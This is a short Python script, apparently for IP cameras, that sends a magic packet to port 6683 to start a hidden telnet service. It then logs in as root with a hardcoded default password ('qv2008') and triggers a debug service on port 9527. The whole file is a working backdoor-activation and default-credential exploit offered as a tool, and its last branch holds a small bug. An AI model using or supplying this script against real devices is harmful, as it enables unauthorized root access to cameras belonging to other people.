import click
from telnetlib import Telnet
import struct
import socket

name = "qvtool"
user = "root"
password = "qv2008"

def opentelnet(HOST):
    port = 6683
    val = 305419896
    typ = 1
    arg = "telnetd".encode('ascii')
    data = struct.pack("ii1024s", val, typ, arg)
    s = socket.socket()
    s.connect((HOST, port))
    s.send(data)
    s.close()

def open9527(HOST):
    tn = Telnet(HOST)
    tn.read_until(b"login: ")
    tn.write(b"root\n")
    if password:
        tn.read_until(b"Password: ")
        tn.write(b"qv2008\n")
    tn.read_until(b"#")
    tn.write(b"killall -USR1 interDebug\n")
    tn.read_until(b"#")
    tn.write(b"exit\n")

@click.command()
@click.option('-ip', help = "ip of your , example -> 192.168.1.10")
@click.option('-port', default = 9527 , help = "the port of you want to open -> 23 or 9527")
def main(ip, port):
    """ simple program that can open 25 or 9527 port of your ipc """
    if port == 9527:
        opentelnet(ip)
        click.echo("has opened the port 23, ip-->" + ip)
        open9527(ip)
        click.echo("has opened the port 9527, ip-->" + ip)
    elif port == 23:
        opentelnet(ip)
        click.echo("has opened the port 23 ip-->", + ip)